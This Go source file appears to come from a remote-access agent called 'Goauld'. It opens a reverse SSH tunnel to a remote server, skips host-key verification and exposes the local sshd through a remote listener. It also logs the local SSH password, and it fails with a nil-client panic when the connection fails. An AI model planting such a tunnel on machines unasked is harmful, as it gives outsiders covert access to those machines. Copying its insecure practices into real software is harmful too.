package ssh

import (
	"Goauld/agent/agent"
	"Goauld/agent/ssh/transport"
	"Goauld/common/log"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io"
	"net"
)

func connect() error {

	privateKey, err := ssh.ParsePrivateKey([]byte(agent.Get().SShPrivateKey))
	if err != nil {
		return err
	}
	sshConfig := &ssh.ClientConfig{
		User:            agent.Get().Id,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(privateKey)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client := initClient(sshConfig)

	defer client.Close()

	remoteListener, err := client.Listen("tcp", agent.Get().RemoteForwardedSshdAddress())
	if err != nil {
		return fmt.Errorf("failed to start remote listener: %w", err)
	}

	remotePort := remoteListener.Addr().(*net.TCPAddr).Port
	log.Info().Msgf("Remote port: %d", remotePort)
	log.Info().Msg("LocalSshPassword is:")
	log.Trace().Msg(agent.Get().LocalSShdPassword())
	defer remoteListener.Close()

	for {
		remoteConn, err := remoteListener.Accept()
		if err != nil {
			// TODO faire du throttle si on garde l'erreur, voir pour cuoper proprement après un temp ?
			log.Error().Err(err).Msg("failed to accept remote connection")
			continue
		}

		go func() {

			localConn, err := net.Dial("tcp", agent.Get().LocalSShdAddress())
			if err != nil {
				log.Error().Err(err).Msg("failed to connect to local service")
				return
			}
			defer localConn.Close()
			//TODO: gérer proprement les Copy?
			go io.Copy(localConn, remoteConn)
			io.Copy(remoteConn, localConn)
		}()

	}
	return nil
}

func initClient(sshConfig *ssh.ClientConfig) *ssh.Client {
	client, err := transport.DirectSshConnect(sshConfig)
	if err == nil {
		return client
	}
	log.Error().Err(err).Msg("failed to direct connect to remote ssh service")
	// TODO handle other connections (tlssh, wssh, sshttp, etc...)
	return nil
}

func Connect() {
	go connect()
}
